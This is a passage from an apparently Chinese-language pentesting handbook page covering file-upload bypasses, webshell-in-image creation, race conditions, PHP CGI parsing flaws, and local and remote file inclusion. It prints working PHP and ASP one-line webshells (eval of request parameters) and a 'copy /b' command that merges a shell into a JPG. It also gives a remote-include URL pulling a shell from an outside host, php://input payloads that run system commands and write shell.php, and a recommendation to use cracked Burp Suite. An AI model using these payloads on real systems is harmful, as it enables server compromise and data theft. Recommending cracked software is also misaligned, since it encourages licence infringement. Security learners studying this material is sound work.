</code></pre></div><p>将冒号后面的文件依附在前面的文件之中</p> <p>而且无法看出来，打开附属文件的方法是使用cmd打开</p> <p>在win里面保存文件的格式是<code>777.txt::$DATA</code>保存文件的时候默认情况下会加上这一串</p> <p>这对于Windows来说两个是一样的，但是对于后端来说他就是两个东西</p> <p>上传文件的流程：</p> <p>网页上传 -&gt; 目标服务器缓存 -&gt; 移动到开发写好的地址 -&gt; 重命名(开发)</p> <p>白名单上传相对于黑名单来说会更加麻烦一点，但是作为渗透人员就是要不断的绕过别人的防御</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304212349857.webp" alt="Img"></p> <p>这种方法也是绕过的一种方法</p> <p>有的时候后端还会检查你的jpg文件头是否匹配，如果不匹配，即使你是jpg结尾也无法上传</p> <p>解决方法：图片木马</p> <ul><li>图片木马就可以把图片和一句话木马结合到一起变成图片木马</li></ul> <p>操作就是随便找一张图片，然后再创建一个txt文件，在这个文件里面写上一句话木马<code>&lt;?php @eval($_REQUEST[8]); ?&gt;</code></p> <p>然后把这两个文件放在同一个目录下，然后打开cmd输入命令</p> <div class="language-cmd extra-class"><pre class="language-text"><code>copy (文件名).jpg/b + (一句话木马的文件名).txt (生成的木马图片名称).jpg

实例：

copy 1.jpg/b + a.txt 123.jpg
</code></pre></div><p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304220004269.webp" alt="Img"></p> <p>不过这样生成的一句话木马就放在图片的16进制最下面，有的时候安全防护这边也会对其进行防护，这个时候就可以使用复合图片的形式</p> <blockquote><p>A图片 + 一句话木马 + A图片</p></blockquote> <p>00截断</p> <h2 id="二次渲染"><a href="#二次渲染" class="header-anchor">#</a> 二次渲染</h2> <p>二次渲染的意思就是，当你上传的文件是图片类型的时候，他会照着你的图片，给你画一个一模一样的上传服务器，而不是直接上传你的源文件</p> <p>在文件上传过程中，如果是上传图片类型的，有时会遇见二次渲染。这个时候，无论怎么在图片里做手脚都无济于事。</p> <p>上传的图片类型文件越小越好</p> <p>不过一样有个解决方法，就是在上传一个gif文件，然后在开头处手动写一个一句话木马(最好是在文件的第三行开始写)</p> <h2 id="条件竞争"><a href="#条件竞争" class="header-anchor">#</a> 条件竞争</h2> <p>文件上传的检测流程：</p> <ul><li><p>先检测后上传</p></li> <li><p>先上传后检测</p></li></ul> <p>如果我们上传的速度够快电脑来不及删除，那就意味着我上传成功。电脑就会被植入木马</p> <p>但是如果刚连接上就被删了也没意义。所以这个时候就可以对php里的内容做手脚</p> <p>在php里让php帮我们写一个马然后存在本地，这样不就绕过了</p> <p>这时候就需要认识一下<a href="https://www.w3school.com.cn/php/php_file_create.asp" target="_blank" rel="noopener noreferrer">php的文件操作<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>方法</p> <p>解析漏洞</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304230930103.webp" alt="Img"></p> <p>同一环境下的网站他可能即支持php也支持asp。环境是可以混合的而且这种还是很常见的</p> <p>一般来说aspx的站点会兼容ASP</p> <p>asp一句话木马</p> <div class="language-ASP extra-class"><pre class="language-text"><code>&lt;%eval request(&quot;a&quot;)%&gt;
</code></pre></div><h2 id="php-cgi解析漏洞"><a href="#php-cgi解析漏洞" class="header-anchor">#</a> PHP CGI解析漏洞</h2> <p>php和web容器交互是有两种方法的</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304231916418.webp" alt="Img"></p> <p>如何判断一个网页是否存在CGI漏洞？</p> <blockquote><p>随便寻找任意的一个站点，复制他的图片然后在url上加上<code>/.php</code>如果页面出现乱码，就证明他存在CGI漏洞</p></blockquote> <p>一般情况下渗透需要信息收集</p> <p><code>|IP|端口|路径|旁站|中间件版本|指纹识别|Whois</code></p> <p>渗透测试： 测试 -&gt; 尝试 -&gt; 你需要花费大量的时间和精力</p> <p><code>状态码： 403 404 401 302 200 500(502) 304</code></p> <p>这是有关于<a href="https://www.runoob.com/http/http-status-codes.html" target="_blank" rel="noopener noreferrer">状态码的扩展<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>挖洞、细心</p> <h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="header-anchor">#</a> 文件包含漏洞</h2> <p>这里先介绍以下文件包含。</p> <p>顾名思义就是在一个php或者其他类型的语言文件中去包含另一个文件里的内容。</p> <p>在php中的文件包含写法是这样的</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p>而这个被包含的<code>1.txt</code>如果他里面的内容是php代码，也就是说即使他的扩展名是txt，他最终也会被以php代码的形式解析并执行</p> <p>构造请求的格式是</p> <blockquote><p><code>http://127.0.0.1?include.php=1.txt</code></p></blockquote> <p>本地包含漏洞也分为有限制和无限制</p> <ul><li>有限制</li></ul> <ol><li>%00截断。</li></ol> <p>条件是php版本要小于5.3.4局限性很大，不常见。</p> <ol start="2"><li>长度截断</li></ol> <p>条件：windows：点号需要长于256;Linux长于4096</p> <p>在参数的最后端一直添加<code>/../../</code>或者<code>.</code></p> <h3 id="远程包含漏洞-有限制-无限制"><a href="#远程包含漏洞-有限制-无限制" class="header-anchor">#</a> 远程包含漏洞-有限制-无限制</h3> <p>想要确保可以使用远程包含漏洞就要确保php服务的<code>allow_url_include</code>开关必须是开着的</p> <p>在服务器没有做任何限制的情况下，可以这样getshell</p> <p>请求包:<code>http://127.0.0.1?include.php?filename=http://www.xxx.com/xxx/1.txt</code></p> <p>这样他就会去主动包含这个网址下的这个文件。然后我们再在这个文件内写入一句话木马，也就成功的拿到了webshell</p> <br> <p>有的网站可能会做这么一个防护，就是他会将你包含过来的文件强制添加一个扩展名例如html这个扩展名，解决方法也很简单。在最后加多一个<code>?</code>就行了或者<code>%23</code>都行</p> <h3 id="文件读取的一些操作"><a href="#文件读取的一些操作" class="header-anchor">#</a> 文件读取的一些操作</h3> <p><strong>file协议</strong></p> <ul><li>读取文件源码用法、</li></ul> <div class="language- extra-class"><pre class="language-text"><code>http://127.0.0.1/include.php?filename=php://filter/read=convert.base64-encode/resource=1.txt
</code></pre></div><p>这个方法就可以进行对文件的一些读取，最终读取出来的文件是以base64编码后的内容</p> <ul><li>执行php代码用法</li></ul> <p><code>php://input + [POST DATA]</code></p> <div class="language- extra-class"><pre class="language-text"><code>http://127.0.0.1/include.php?file=php://input

[POST DATA部分]
</code></pre></div><p>例如</p> <div class="language- extra-class"><pre class="language-text"><code>http://127.0.0.1/include.php?file=php://input

&lt;?php system('ipconfig')?&gt;
</code></pre></div><ul><li>利用phpfile协议进行写入一句话木马</li></ul> <div class="language-php extra-class"><pre class="language-php"><code>http://127.0.0.1/include.php?file=php://input

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php,'</span>w<span class="token string single-quoted-string">'),'</span><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>'); ?&gt;
</code></pre></div><p>这样就可以写入一个shell.php的一句话木马文件</p> <h2 id="数据溢出绕过"><a href="#数据溢出绕过" class="header-anchor">#</a> 数据溢出绕过</h2> <p>在请求包里面复制粘贴大量的垃圾数据，也就是没有任何价值和作用的字符串，导致后端数据溢出，让文件上传成功</p> <p>请求包的主要格式是</p> <h2 id="burpsuite"><a href="#burpsuite" class="header-anchor">#</a> Burpsuite</h2> <p>这是一款功能非常强大的抓包改包软件。在Windows环境下，如果要使用这个工具。建议使用Java8的Java环境。</p> <p>如果是Java8以上的环境建议使用最新版的<code>burpsuite</code>。否则会出现不兼容无法使用。高版本也有很多好用的功能</p> <p>比如说：</p> <ul><li>1、高版本中内置了一个浏览器，可以免去安装HTTPS证书</li> <li>2、并且不再需要手动配置代理</li> <li>3、功能更多更完善</li></ul> <p>建议是使用破解专业版，因为在实际做题的时候如果遇见需要爆破的场景，社区版是不支持开启多线程模式的，而付费版是可以开启多线程模式的。</p> <p>这样一来可以大大的提升请求速度，节约时间成本，以至于在爆破一些比较大的数据时会耗时过久</p> <p>这里附上一个使用多线程的方法</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304092124888.webp" alt="Img"></p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/blog2/handbook/csrf.html" class="prev">
        CSRF
      </a></span> <span class="next"><a href="/blog2/handbook/验证码绕过.html">
        验证码绕过
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/blog2/assets/js/app.8931c98e.js" defer></script><script src="/blog2/assets/js/2.733019b2.js" defer></script><script src="/blog2/assets/js/33.d4bdaa6f.js" defer></script>
  </body>
</html>
